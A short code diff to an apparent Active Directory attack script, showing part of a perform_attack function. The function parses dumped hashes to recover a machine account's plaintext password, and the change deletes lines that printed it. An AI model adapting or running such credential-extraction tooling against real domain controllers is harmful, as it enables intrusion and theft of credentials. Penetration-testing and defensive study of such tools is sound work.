@@ -274,9 +274,6 @@ def perform_attack(dc_handle, dc_ip, target_computer):
                         hashes = line.split(':')
                         # search for "\" requires "\\\\"
                         plain_password_hex = hashes[2]
-                        print()
-                        print(RED+"[+] "+NOCOLOR, end = '')
-                        print(username+" "+hostname+" "+options.dc_ip+" "+plain_password_hex)
                         password = unhexlify(plain_password_hex.strip())
                         print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                         print(WHITE+"Attempting to repare "+hostname+NOCOLOR)
